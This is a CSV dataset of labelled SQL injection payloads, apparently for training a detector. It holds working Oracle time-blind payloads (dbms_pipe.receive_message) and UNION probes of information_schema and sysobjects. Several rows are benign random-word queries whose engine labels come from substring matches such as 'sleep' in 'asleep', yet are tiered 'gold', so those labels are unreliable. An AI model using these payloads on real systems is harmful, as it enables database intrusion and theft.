id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
25378,"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'dbsm' = 'dbsm",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'dbsm' = 'dbsm",False,0,"__INT__ ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( __IDENT__",dad0b5cc,gold
20274,"1"" ) ) as duny where 3756 = 3756 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1"" ) ) as duny where 3756 = 3756 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",dafda3f3,gold
23815,"1"" ) ) as uels where 9447 = 9447 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1"" ) ) as uels where 9447 = 9447 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",False,0,"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",dafda3f3,gold
24434,"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) # dbzk",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) # dbzk",False,0,"__INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) # __IDENT__",dc11021e,gold
2387,"1"" ) where 2702 = 2702 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1"" ) where 2702 = 2702 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",False,0,"__INT__"" ) where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",dd11b329,gold
19969,"1"" ) where 3943 = 3943 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1"" ) where 3943 = 3943 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__"" ) where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",dd11b329,gold
24986,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",False,0,"__INT__' and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",e458455f,gold
19647,"1 ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__ ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",e7afb298,gold
23215,"1 ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__ ) ) ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",e8ada0bc,gold
1589,"1 ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",False,0,"__INT__ ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ )",e8beda49,gold
22140,"1 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",edc4ba18,gold
19006,"1%' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( '%' = '",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( '%' = '",False,0,"__INT__ % ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( % __STR__",eea1ea4a,gold
23667,"1%"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""%"" = """,False,0,"__INT__ % ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( ( ( % __STR__",eea1ea4a,gold
19385,"1' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,"__INT__' ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",f2668374,gold
20016,"1 ) ) as mmby where 3990 = 3990 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) ) as mmby where 3990 = 3990 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",f414fa7f,gold
25530,"1 ) ) as midl where 9046 = 9046 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) ) as midl where 9046 = 9046 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",False,0,"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",f414fa7f,gold
1887,"1' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,"__INT__' ) ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",f84828c1,gold
19189,"1 ) as obhj where 1789 = 1789 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) as obhj where 1789 = 1789 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",False,0,"__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",fc4de7d9,gold
21543,"1 ) as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1 ) as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,"__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",fc4de7d9,gold
19783,"1%"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2,"1%"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,"__INT__ % "" ) ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",fd0dc85f,gold
35634,SELECT hall FROM means UNION ALL SELECT connected FROM chart ORDER BY similar,union_based,mssql,0.9,Signals: 'char'; UNION-based payload detected; DB: mssql,2,SELECT hall FROM means UNION ALL SELECT connected FROM chart ORDER BY similar,False,0,select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,64b1bf49,gold
34449,"SELECT gas,tree FROM review WHERE question = 'today' UNION SELECT old, charge FROM average",union_based,mssql,0.9,Signals: 'char'; UNION-based payload detected; DB: mssql,2,"SELECT gas,tree FROM review WHERE question = 'today' UNION SELECT old, charge FROM average",False,0,"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",70758bb8,gold
78,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",union_based,mssql,0.9,Signals: 'sysobjects'; UNION-based payload detected; DB: mssql,2,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",False,0,"__INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __IDENT__ from sysobjects where __IDENT__ = __STR__ --",bffb31a0,gold
35283,SELECT purple FROM grabbed UNION SELECT tea FROM careful ORDER BY character,union_based,mssql,0.9,Signals: 'char'; UNION-based payload detected; DB: mssql,2,SELECT purple FROM grabbed UNION SELECT tea FROM careful ORDER BY character,False,0,select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,ce6329ea,gold
171,union select * from users where login = char ...,union_based,mssql,0.9,Signals: 'char'; UNION-based payload detected; DB: mssql,2,union select * from users where login = char ...,False,0,union select * from __IDENT__ where __IDENT__ = char ...,d8d278ff,gold
40485,"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",union_based,mssql,0.9,Signals: 'sysobjects'; UNION-based payload detected; DB: mssql,2,"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",False,0,"' union select null , null , null from sysobjects --",e6dfc3c6,gold
34647,"SELECT giant,having FROM suit WHERE medicine = 'read' UNION SELECT explanation, biggest FROM time",union_based,mysql,0.9,Signals: 'exp'; UNION-based payload detected; DB: mysql,2,"SELECT giant,having FROM suit WHERE medicine = 'read' UNION SELECT explanation, biggest FROM time",False,0,"select __IDENT__ , having from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",170127fa,gold
40531,"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",union_based,mysql,0.9,Signals: 'information_schema'; UNION-based payload detected; DB: mysql,2,"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",False,0,"__INT__ union select __IDENT__ , null from information_schema . __IDENT__ limit __INT__ --",1bf4417b,gold
24015,"1'+ ( select 'qvif' where 1758 = 1758 union all select null,null,null,null,null,null,null,null#",union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2,"1'+ ( select 'qvif' where 1758 = 1758 union all select null,null,null,null,null,null,null,null#",False,0,"1__STR__qvif' where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null#",5bd95d34,gold
35565,SELECT business FROM word UNION ALL SELECT desk FROM exactly ORDER BY fear,union_based,mysql,0.9,Signals: 'ord'; UNION-based payload detected; DB: mysql,2,SELECT business FROM word UNION ALL SELECT desk FROM exactly ORDER BY fear,False,0,select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,64b1bf49,gold
34942,SELECT advice FROM heart UNION ALL SELECT rhyme FROM room ORDER BY felt,union_based,mysql,0.9,Signals: 'elt'; UNION-based payload detected; DB: mysql,2,SELECT advice FROM heart UNION ALL SELECT rhyme FROM room ORDER BY felt,False,0,select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,64b1bf49,gold
35675,SELECT opinion FROM difficult UNION ALL SELECT see FROM court ORDER BY realize,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2,SELECT opinion FROM difficult UNION ALL SELECT see FROM court ORDER BY realize,False,0,select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,64b1bf49,gold
35740,"SELECT asleep,hat FROM vast WHERE typical = 'his' UNION SELECT using, whenever FROM meal",union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,2,"SELECT asleep,hat FROM vast WHERE typical = 'his' UNION SELECT using, whenever FROM meal",False,0,"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",70758bb8,gold
35444,"SELECT trip,shore FROM answer WHERE gulf = 'more' UNION SELECT record, melted FROM tea",union_based,mysql,1.0,"Signals: 'elt', 'ord'; UNION-based payload detected; DB: mysql",2,"SELECT trip,shore FROM answer WHERE gulf = 'more' UNION SELECT record, melted FROM tea",False,0,"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",70758bb8,gold
35395,"SELECT ship,thread FROM different WHERE himself = 'remove' UNION SELECT was, circus FROM alike",union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2,"SELECT ship,thread FROM different WHERE himself = 'remove' UNION SELECT was, circus FROM alike",False,0,"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",70758bb8,gold
35719,"SELECT my,spoken FROM record WHERE music = 'cross' UNION SELECT lion, make FROM tight",union_based,mysql,0.9,Signals: 'ord'; UNION-based payload detected; DB: mysql,2,"SELECT my,spoken FROM record WHERE music = 'cross' UNION SELECT lion, make FROM tight",False,0,"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",70758bb8,gold
35494,"SELECT buy,them FROM changing WHERE difference = 'major' UNION SELECT dead, tightly FROM hang",union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2,"SELECT buy,them FROM changing WHERE difference = 'major' UNION SELECT dead, tightly FROM hang",False,0,"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",70758bb8,gold
35264,SELECT yes FROM widely UNION ALL SELECT if FROM independent ORDER BY native,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2,SELECT yes FROM widely UNION ALL SELECT if FROM independent ORDER BY native,False,0,select __IDENT__ from __IDENT__ union all select if from __IDENT__ order by __IDENT__,7093c37a,gold
40532,"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",union_based,mysql,0.9,Signals: 'information_schema'; UNION-based payload detected; DB: mysql,2,"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",False,0,"__INT__ union select __IDENT__ , null from information_schema . __IDENT__ where __IDENT__ = __STR__ --",73c5edab,gold
34547,SELECT hat FROM felt UNION ALL SELECT rich FROM last ORDER BY create,union_based,mysql,0.9,Signals: 'elt'; UNION-based payload detected; DB: mysql,2,SELECT hat FROM felt UNION ALL SELECT rich FROM last ORDER BY create,False,0,select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by create,7b43c9ee,gold
35640,SELECT account FROM come UNION ALL SELECT expect FROM like ORDER BY barn,union_based,mysql,0.9,Signals: 'exp'; UNION-based payload detected; DB: mysql,2,SELECT account FROM come UNION ALL SELECT expect FROM like ORDER BY barn,False,0,select __IDENT__ from __IDENT__ union all select __IDENT__ from like order by __IDENT__,818ad2dc,gold
35645,SELECT although FROM order UNION SELECT over FROM single ORDER BY third,union_based,mysql,0.9,Signals: 'ord'; UNION-based payload detected; DB: mysql,2,SELECT although FROM order UNION SELECT over FROM single ORDER BY third,False,0,select __IDENT__ from order union select __IDENT__ from __IDENT__ order by __IDENT__,a47f7963,gold
35141,"SELECT machinery,add FROM army WHERE wife = 'brown' UNION SELECT information, ready FROM one",union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2,"SELECT machinery,add FROM army WHERE wife = 'brown' UNION SELECT information, ready FROM one",False,0,"select __IDENT__ , add from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",b19997a8,gold
35763,"SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather",union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,2,"SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather",False,0,"select __IDENT__ , __IDENT__ from __IDENT__ where sleep = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",b4582263,gold
35731,SELECT swimming FROM explore UNION SELECT therefore FROM hungry ORDER BY base,union_based,mysql,0.9,Signals: 'exp'; UNION-based payload detected; DB: mysql,2,SELECT swimming FROM explore UNION SELECT therefore FROM hungry ORDER BY base,False,0,select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,ce6329ea,gold
35447,SELECT before FROM know UNION SELECT fifty FROM learn ORDER BY every,union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2,SELECT before FROM know UNION SELECT fifty FROM learn ORDER BY every,False,0,select __IDENT__ from __IDENT__ union select __IDENT__ from __IDENT__ order by __IDENT__,ce6329ea,gold
24751,"1 ) as qzif where 7877 = 7877 union all select null,null,null,null,null,null,null--",union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2,"1 ) as qzif where 7877 = 7877 union all select null,null,null,null,null,null,null--",False,0,"__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null --",db9809b9,gold
1830,"-3137'|| ( select 'btif' where 1718 = 1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",union_based,mysql,0.9,Signals: 'if'; UNION-based payload detected; DB: mysql,2,"-3137'|| ( select 'btif' where 1718 = 1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",False,0,"-3137__STR__btif' where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",e9515d70,gold
11300,) union select * from information_schema.tables,union_based,mysql,0.9,Signals: 'information_schema'; UNION-based payload detected; DB: mysql,2,) union select * from information_schema.tables,False,0,) union select * from information_schema . __IDENT__,f838b178,gold
35566,"SELECT automobile,large FROM sleep WHERE extra = 'biggest' UNION SELECT sheet, had FROM rabbit",union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,2,"SELECT automobile,large FROM sleep WHERE extra = 'biggest' UNION SELECT sheet, had FROM rabbit",False,0,"select __IDENT__ , __IDENT__ from sleep where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",fa5a7816,gold
19177,"-7194'|| ( select 'gbrx' from dual where 6205 = 6205 union all select 6205,6205,6205,6205,6205,6205,6205#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2,"-7194'|| ( select 'gbrx' from dual where 6205 = 6205 union all select 6205,6205,6205,6205,6205,6205,6205#",False,0,"-7194__STR__gbrx' from dual where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__#",2bc3ff6f,gold
24264,"-1876'|| ( select 'itfc' from dual where 9584 = 9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2,"-1876'|| ( select 'itfc' from dual where 9584 = 9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",False,0,"-1876__STR__itfc' from dual where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",307ba0e4,gold
25524,"1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2,"1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--",False,0,"1__STR__dpce' from dual where __INT__ = __INT__ union all select null , null , null , null , null , null --",776dc321,gold
19499,"1'|| ( select 'xjcg' from dual where 5815 = 5815 union all select null,null,null#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2,"1'|| ( select 'xjcg' from dual where 5815 = 5815 union all select null,null,null#",False,0,"1__STR__xjcg' from dual where __INT__ = __INT__ union all select null , null , null#",9a05568d,gold
23711,"-8677'|| ( select 'ihpm' from dual where 9571 = 9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2,"-8677'|| ( select 'ihpm' from dual where 9571 = 9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",False,0,"-8677__STR__ihpm' from dual where __INT__ = __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",200e44e4,gold
